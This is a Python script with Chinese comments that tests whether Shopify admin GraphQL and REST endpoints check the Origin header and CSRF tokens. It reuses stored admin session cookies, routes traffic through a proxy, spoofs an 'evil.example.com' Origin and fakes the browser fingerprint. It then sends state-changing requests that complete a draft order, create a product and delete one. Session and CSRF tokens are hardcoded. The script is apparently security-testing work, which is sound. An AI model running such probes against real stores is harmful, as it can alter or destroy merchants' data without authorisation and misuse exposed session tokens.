# -*- coding: utf-8 -*-
"""CSRF/Origin 校验测试:admin GraphQL/REST 是否校验 Origin 与 CSRF Token
如果带 evil Origin + 无/伪 CSRF token 仍能执行 -> 跨站请求伪造可利用
"""
from curl_cffi import requests

COOKIE_FILE = r"C:\Users\tndc2\AppData\Local\Temp\admin_cookies.txt"
PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}

def load_cookies():
    raw = open(COOKIE_FILE, encoding="utf-8").read().strip()
    return {k: v for k, v in (p.split("=", 1) for p in raw.split("; ") if "=" in p)}

BASE = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Origin": "https://evil.example.com",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
}

GQL_URL = "https://admin.shopify.com/api/operations/12af77c8135a10656e3cf14cb69d746505a1df3b62c08faea80a0a3949c21f8d/DraftOrderComplete/shopify/jqpkdm-kb"
BODY = {
    "operationName": "DraftOrderComplete",
    "variables": {"id": "gid://shopify/DraftOrder/1102015168554", "paymentPending": True,
                  "paymentGatewayId": None, "sourceName": "shopify_draft_orders", "bypassCartValidations": False},
    "extensions": {"client_context": {"page_view_token": "81a384a6-1a26-4f04-93a2-faca565b1f40",
        "client_route_handle": "draftOrders:show", "client_pathname": "/store/jqpkdm-kb/draft_orders/1102015168554",
        "client_normalized_pathname": "/store/:storeHandle/draft_orders/:id",
        "shopify_session_token": "0f6832a6-1f3c-40ef-805e-29f861ec7367",
        "shopify_multitrack_token": "34b29e38-9809-47b2-ac03-64535d399fdd"}},
}

def probe(label, headers_extra, body=None, url=GQL_URL):
    h = dict(BASE)
    h.update(headers_extra)
    try:
        r = requests.post(url, json=body if body is not None else BODY, headers=h, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=30)
        print(f"[{label}] HTTP {r.status_code} | {r.text[:180]}")
        return r
    except Exception as e:
        print(f"[{label}] ERROR {e}")
        return None

if __name__ == "__main__":
    print("== GraphQL CSRF/Origin 测试 ==")
    # 1. 基线:正常 Origin + 正常 CSRF token
    probe("OK-ORIGIN+CSRF", {"Origin": "https://admin.shopify.com", "X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg"})
    # 2. evil Origin + 正常 CSRF
    probe("EVIL-ORIGIN+CSRF", {"X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg"})
    # 3. evil Origin + 无 CSRF
    probe("EVIL-ORIGIN-NO-CSRF", {})
    # 4. evil Origin + 伪 CSRF
    probe("EVIL-ORIGIN+FAKE-CSRF", {"X-CSRF-Token": "fake-token-123"})
    # 5. 无 Origin + 无 CSRF
    probe("NO-ORIGIN-NO-CSRF", {"Origin": ""})
    # 6. null Origin + 无 CSRF
    probe("NULL-ORIGIN-NO-CSRF", {"Origin": "null"})

    print("== REST CSRF/Origin 测试 ==")
    rest_url = "https://admin.shopify.com/store/jqpkdm-kb/products.json"
    h = dict(BASE)
    h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        r = requests.post(rest_url, data={"product[title]": "csrf_test"}, headers=h, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=30)
        print(f"[REST POST evil-origin no-csrf] HTTP {r.status_code} | {r.text[:180]}")
    except Exception as e:
        print(f"[REST POST] ERROR {e}")
    try:
        r = requests.delete(rest_url + "/1", headers=h, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=30)
        print(f"[REST DELETE evil-origin no-csrf] HTTP {r.status_code} | {r.text[:180]}")
    except Exception as e:
        print(f"[REST DELETE] ERROR {e}")
